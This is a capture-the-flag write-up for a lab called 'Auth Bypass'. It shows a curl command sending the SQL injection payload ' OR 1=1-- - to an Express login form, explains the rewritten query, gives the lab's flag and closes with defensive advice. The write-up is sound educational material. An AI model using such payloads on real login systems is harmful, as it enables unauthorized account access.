---
layout: post
title: "Auth Bypass - SQL Injection Login Bypass on Express"
description: "CTF writeup bypassing the Enterprise Authentication System login with a classic SQL injection OR 1=1 payload to authenticate as admin on an Express-based auth service."
category: hackerdna
tags: [web, ctf, hackerdna, sqli, authentication-bypass, login-bypass, express, nodejs]
---

## Auth Bypass - CTF Writeup

**Category:** WEB | **Flags:** 1

Challenge: [https://hackerdna.com/labs/auth-bypass](https://hackerdna.com/labs/auth-bypass)

## Contents

- [Reconnaissance](#reconnaissance)
- [Authentication Bypass](#authentication-bypass)
- [Flag](#flag)

## Reconnaissance

Nmap reveals three open ports:

- **80** - nginx static landing page
- **8080** - Express web service (login portal)
- **7681** - websocket service (attack terminal)

The landing page describes an "Enterprise Authentication System" and points to an
authentication service on the same network. The service on port 8080 is the target:

- `X-Powered-By: Express` - Node.js Express application
- `/login` accepts `username` and `password` via a `POST` form

## Authentication Bypass

The login page builds the SQL query directly from user input without any sanitisation
or parameterisation. With a SQLite backend, the classic tautology payload bypasses
authentication entirely:

```bash
curl -X POST "http://TARGET:8080/login" \
  --data-urlencode "username=' OR 1=1-- -" \
  --data-urlencode "password=x"
```

Comments out the remainder of the WHERE clause (`' OR 1=1-- -`) so the condition
short-circuits to `true` for every row. The application logs in as the first user in
the table, which is `admin`:

```
Authentication Successful!
Welcome, admin!
Flag: 55601b0f-9c0a-4b8a-99ab-2038845bcf64
```

**Flag:** `55601b0f-9c0a-4b8a-99ab-2038845bcf64`

## How the Attack Works

The vulnerable query looks like:

```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```

Injecting `' OR 1=1-- -` as the username produces:

```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = 'x'
```

Because `-- -` comments out the rest of the query, the condition evaluates to
`username = '' OR 1=1`, which is always true. The first matching row (admin) is
returned, and the application trusts the result to grant access. The password
check never runs.

## Key Takeaways

- **Always use parameterised queries.** Never concatenate user input into SQL - the
  correct fix is prepared statements (`?` placeholders) or an ORM.
- **Input validation is not a security boundary.** Whitelists help, but SQL injection
  prevention must happen at the database layer.
- **Authentication should never trust the first row.** Even a correct SQL result
  should be verified against an expected user record.
- **Never expose internal services.** The Express auth API should not sit behind a
  public port without strict access control.